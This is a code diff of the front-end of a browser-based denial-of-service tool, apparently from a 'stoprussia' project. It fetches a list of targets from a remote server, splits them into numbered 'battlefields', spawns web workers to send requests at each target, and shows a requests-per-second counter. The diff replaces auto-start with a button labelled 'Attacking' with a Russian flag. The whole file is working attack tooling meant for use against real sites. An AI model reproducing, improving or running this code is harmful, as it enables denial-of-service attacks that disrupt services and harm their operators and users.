@@ -1,25 +1,7 @@
-document.addEventListener('DOMContentLoaded', () => {
-  const githubLink = document.createElement('a')
-  githubLink.href = 'https://github.com/0x77dev/stoprussia#stoprussia'
-  githubLink.innerText = 'GitHub repository and more info'
-  document.body.append(githubLink)
-  
-  if (location.hash !== '#4') {
-    const latestLink = document.createElement('a')
-    latestLink.href = '/#4'
-    latestLink.innerText = '\n Attack latest targets'
-    document.body.append(latestLink)
-    
-    latestLink.onclick = () => {
-      location.replace('/#4')
-      location.reload()
-    }
-  }
+import './index.css'
 
-  const statusEl = document.createElement('pre')
-  document.body.append(statusEl)
-  const metricsEl = document.createElement('pre')
-  document.body.append(metricsEl)
+const start = () => {
+  const statusEl = document.getElementById('status') as HTMLDivElement
 
   function* getChunks<T = any>(arr: T[], n: number) {
     for (let i = 0; i < arr.length; i += n) {
@@ -34,22 +16,21 @@ document.addEventListener('DOMContentLoaded', () => {
     total++
   }
 
-  setInterval(() => {
-    metricsEl.innerText = `${count} requests/sec; total ${total} requests`
-    count = 0
-  }, 1000)
-
   const start = async () => {
     const res = await fetch('https://srl.0x77.dev')
     let { targets, version } = await res.json() as { targets: string[]; version?: number }
 
     const battlefield = location.hash.length ? parseInt(location.hash.replace('#', '')) - 1 : new Date().getSeconds() % 4
-    targets = [...getChunks(targets, 15)][battlefield]
+    targets = [...getChunks(targets, Math.floor(targets.length/4))][battlefield]
 
     console.log(version, battlefield, targets)
 
-    statusEl.innerText = `Version: ${version}; Battlefield: ${battlefield+1}; Targets: ${targets.length}\n you can specify the battlefield by appending link with # for example: '/#1'\n targets: ${targets}\nalso you can get advantage of multiple tabs`
-    console.log('Spawning workers')
+    statusEl.innerHTML = `Battlefield: ${battlefield+1} <br/> Targets: ${targets.length}`
+
+    setInterval(() => {
+      statusEl.innerHTML = `Battlefield: ${battlefield+1} <br/> Targets: ${targets.length} <br/> ${count} requests/sec; total ${total} requests`
+      count = 0
+    }, 1000)
 
     const spawn = (target: string) => {
       const worker = new Worker(new URL('worker.ts', import.meta.url), { type: 'module' })
@@ -64,6 +45,14 @@ document.addEventListener('DOMContentLoaded', () => {
   }
 
   start()
+}
 
-  setInterval(() => location.reload(), 60 * 60000)
-})
+const startButton = document.getElementById('start') as HTMLLinkElement
+
+startButton.onclick = () => {
+  start()
+  startButton.innerText = `Attacking 🇷🇺 💣`
+  startButton.onclick = null
+}
+
+console.log(startButton)
